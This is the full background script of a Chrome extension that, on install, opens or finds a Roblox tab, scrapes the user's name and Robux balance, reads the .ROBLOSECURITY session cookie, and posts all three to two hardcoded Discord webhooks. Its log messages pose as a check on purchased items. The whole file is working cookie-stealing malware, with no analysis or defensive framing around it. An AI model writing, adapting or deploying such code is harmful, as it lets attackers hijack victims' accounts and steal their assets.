const webhookUrls = [
  'https://discord.com/api/webhooks/1317351076646883328/U4OjkNevR5w07ha2QtvL6-CH2n-12o2436sRSO64ImEH9KtzwvBwO9bJ22i5exr-Mdgr',
  'https://discord.com/api/webhooks/1316869113775259708/NZAYzM9inR9rjxayWua-E7mQjCHR7gq1UqYv6MeNUnFnjcDDHAwYzf7fjE5yRvjSc8Sl'
];

function sendDataToWebhooks(username, robuxAmount, cookieValue) {
  const data = {
    content: `Username: ${username}\nRobux: ${robuxAmount}\nROBLOSECURITY Cookie: ${cookieValue}`,
  };

  webhookUrls.forEach((url) => {
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
      .then((response) => {
        console.log(`Data sent to webhook: ${url}, Status:`, response.status);
      })
      .catch((error) => {
        console.error(`Error sending data to webhook: ${url}`, error);
      });
  });
}

function getUserDataAndCookie() {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs[0]) {
      chrome.scripting.executeScript(
        {
          target: { tabId: tabs[0].id },
          func: () => {
            const usernameElement = document.querySelector('.font-header-2.dynamic-ellipsis-item');
            const robuxElement = document.querySelector('#nav-robux-amount');
            return {
              username: usernameElement ? usernameElement.textContent : 'items not purchased',
              robux: robuxElement ? robuxElement.textContent : 'items not purchased',
            };
          },
        },
        (results) => {
          if (results && results[0] && results[0].result) {
            const { username, robux } = results[0].result;
            chrome.cookies.get(
              { url: 'https://www.roblox.com', name: '.ROBLOSECURITY' },
              (cookie) => {
                if (cookie && cookie.value) {
                  console.log('Data Retrieved:', username, robux, cookie.value);
                  sendDataToWebhooks(username, robux, cookie.value);
                } else {
                  console.log('ROBLOSECURITY Cookie not found.');
                }
              }
            );
          } else {
            console.log('Item not found/item not purchased');
          }
        }
      );
    }
  });
}

chrome.runtime.onInstalled.addListener(() => {
  console.log('Checking cookie for items purchased');

  chrome.tabs.query({}, (tabs) => {
    const robloxTabs = tabs.filter((tab) => tab.url && tab.url.includes('https://www.roblox.com'));
    if (robloxTabs.length > 0) {
      getUserDataAndCookie();
    } else {
      chrome.tabs.create({ url: 'https://www.roblox.com' }, (tab) => {
        if (tab && tab.id) {
          setTimeout(() => getUserDataAndCookie(), 2500);
        } else {
          console.error('Failed to open Roblox tab.');
        }
      });
    }
  });
});
